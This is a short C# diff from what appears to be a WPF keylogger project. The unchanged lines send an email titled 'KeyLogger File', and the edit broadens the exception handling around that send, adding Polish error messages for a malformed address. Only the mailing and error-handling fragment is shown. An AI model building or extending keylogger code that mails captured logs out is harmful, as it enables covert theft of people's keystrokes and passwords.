@@ -49,9 +49,13 @@ namespace WpfApplication8
                 message.Subject = "KeyLogger File";
                 client.Send(message);
             }
-            catch (ArgumentException ex)
+            catch (Exception ex)
             {
-                Console.WriteLine("Pusty adres e-mail ");
+                if(ex is ArgumentException || ex is FormatException)
+                {
+                    Console.WriteLine("Zły format maila");
+                    MessageBox.Show("Zły fromat maila!");
+                }
             }
             client.Dispose();
             //Console.WriteLine(" Message sent ");
